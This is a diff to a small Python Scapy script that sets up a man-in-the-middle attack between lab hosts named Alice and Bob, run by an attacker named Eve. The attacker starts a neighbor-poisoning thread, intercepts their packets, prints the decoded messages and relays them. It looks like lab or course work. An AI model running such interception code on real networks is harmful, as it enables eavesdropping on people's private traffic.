@@ -1,16 +1,7 @@
 from scapy.all import *
-
-# Eve details
-EVE_IPv6 = "fe80::82b5:2e0c:405:fead"
-EVE_MAC = "08:00:27:18:b4:02"
-
-# Alice details
-ALICE_IPv6 = "fe80::43cc:ca2f:ae1f:dbed"
-ALICE_MAC = "08:00:27:53:f5:cb"
-
-# Bob details
-BOB_IPv6 = "fe80::1eaa:7821:6306:2979"
-BOB_MAC = "08:00:27:ab:33:74"
+from network_details import *
+from threading import Thread
+import poisoner
 
 def printConversation(pkt):
     if pkt[Ether].src == ALICE_MAC:
@@ -18,8 +9,13 @@ def printConversation(pkt):
     else:
         pkt[Ether].dst = ALICE_MAC
     
-    if TCP in pkt and Raw in pkt:
-        print(pkt[Raw])
+    if Raw in pkt:
+        content = pkt[Raw].load.decode()
+        if pkt[Ether].src == ALICE_MAC:
+            print("Alice: " + content)
+        else:
+            print("Bob: " + content)
+    
     sendp(pkt, verbose=0)
 
 def AliceAndBobConnect(pkt):
@@ -36,7 +32,12 @@ def AliceAndBobConnect(pkt):
 
 
 def main():
+    # poison
+    Thread(target=poisoner.poison, args=()).start()    
+    
+    # and start listening to Alice & Bob conversation
     sniff(lfilter=AliceAndBobConnect, prn=printConversation)
+    
     
 if __name__ == "__main__":
     main()
